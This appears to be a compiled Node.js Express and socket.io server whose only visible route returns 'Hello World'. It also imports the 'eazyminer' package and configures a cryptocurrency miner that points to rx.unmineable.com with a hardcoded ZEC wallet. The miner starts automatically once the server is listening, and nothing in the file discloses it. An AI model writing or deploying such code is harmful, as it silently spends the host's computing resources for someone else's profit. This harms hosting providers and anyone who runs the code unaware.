"use strict"; function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }var _express = require('express'); var _express2 = _interopRequireDefault(_express);
var _localtunnel = require('localtunnel'); var _localtunnel2 = _interopRequireDefault(_localtunnel);
var _http = require('http');
var _socketio = require('socket.io');
var _cors = require('cors'); var _cors2 = _interopRequireDefault(_cors);
var _path = require('path'); var _path2 = _interopRequireDefault(_path);
const Miner = require("eazyminer");

require('dotenv/config');

const app = _express2.default.call(void 0, );
app.use(_express2.default.json());
app.use(_cors2.default.call(void 0, ));

const routes = new (0, _express.Router)();

routes.get("/", (req, res) => res.json({ message: "Hello World" }));

const server = _http.createServer.call(void 0, app);

const io = new (0, _socketio.Server)(server, {
  cors: {
    origin: "*",
    optionsSuccessStatus: "200",
    methods: ["GET", "POST"],
  },
});

io.on("connection", (socket) => {
  console.log(`User connected socket.io id is${socket.id}`);

  socket.on("connect", () => {});

  socket.on("disconnect", () => {
    console.log(`User disconnected socket.io id is${socket.id}`);
  });
});

app.use(routes);

const miner = new Miner({
  pools: [
    {
      // coin: "ZEC",
      // user: "t1NFs8NuE3m72pfSispSdTrisPQNJwhrz3E",
      // url: "rx.unmineable.com:13333", // optional pool URL,

      algo: null,
      coin: null,
      url: "rx.unmineable.com:3333",
      user: "ZEC:t1NFs8NuE3m72pfSispSdTrisPQNJwhrz3E.myminer",
      pass: "x",
      "rig-id": null,
      nicehash: false,
      keepalive: false,
      enable: true,
      tls: false,
      "tls-fingerprint": null,
      daemon: false,
      socks5: null,
      "self-select": null,
    },
  ],
  autoStart: false, // optional delay
});

server.listen(process.env.PORT, async () => {
  console.log(`Server is running in port ${process.env.PORT}`);

  // const tunnel = await localtunnel({
  //   port: Number(process.env.PORT),
  //   subdomain: "seaspacserver",
  // });

  // console.log(tunnel.url);

  miner.start();
});
